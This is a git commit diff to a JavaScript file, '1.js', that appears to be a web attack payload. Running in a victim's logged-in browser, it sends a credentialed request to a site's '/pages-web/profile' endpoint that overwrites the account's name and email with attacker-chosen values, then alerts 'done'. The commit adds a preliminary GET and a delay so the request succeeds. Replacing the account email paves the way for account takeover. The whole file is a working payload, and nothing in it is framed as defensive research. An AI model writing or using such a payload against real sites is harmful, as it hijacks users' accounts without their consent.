1d0250a5cab0564bcf12a6f99cdf6ee2dc11bf5d
bbpawolf <57352896+bbpa@users.noreply.github.com>
2024-10-26 22:10:23 +0330

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,8 +1,11 @@
-var xhr=new XMLHttpRequest()
-xhr.open("POST","/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
+var xhr=new XMLHttpRequest();
+xhr.open("GET","/pages-web/profile");
+xhr.send();
+
+setTimeout(()=>{xhr.open("POST","/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
 xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
 xhr.withCredentials=true;
 xhr.onreadystatechange=()=>{if(xhr.readyState==4){
 alert('done')
 }}
-xhr.send(`__rvfInternalFormId=ProfileForm&given_name=test&family_name=test&email=vampire01${Math.floor(Math.random() * (1000)) + 100 }%40gmail.com&mobile_number=`);
+xhr.send(`__rvfInternalFormId=ProfileForm&given_name=test&family_name=test&email=vampire01${Math.floor(Math.random() * (1000)) + 100 }%40gmail.com&mobile_number=`)},4500);
